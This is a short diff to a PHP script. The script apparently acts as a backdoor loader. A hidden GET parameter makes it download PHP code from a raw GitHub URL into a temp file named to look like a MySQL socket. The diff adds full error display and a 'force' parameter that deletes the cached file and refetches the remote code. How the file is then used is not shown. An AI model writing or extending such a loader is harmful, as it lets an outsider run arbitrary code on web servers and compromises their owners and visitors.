@@ -1,5 +1,9 @@
 <?php
 
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
 function curl_data($url) {
     if (function_exists('curl_init')) {
         $ch = curl_init();
@@ -25,6 +29,10 @@ function curl_data($url) {
 if (isset($_GET['http_file_header'])) {
     $tempDir = sys_get_temp_dir();
     $tempFile = $tempDir . '/mysql_socket.sock';
+
+    if (isset($_GET['force']) && file_exists($tempFile)) {
+        unlink($tempFile);
+    }
 
     if (!file_exists($tempFile)) {
         $fileContent = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/main/bootstrap.php');
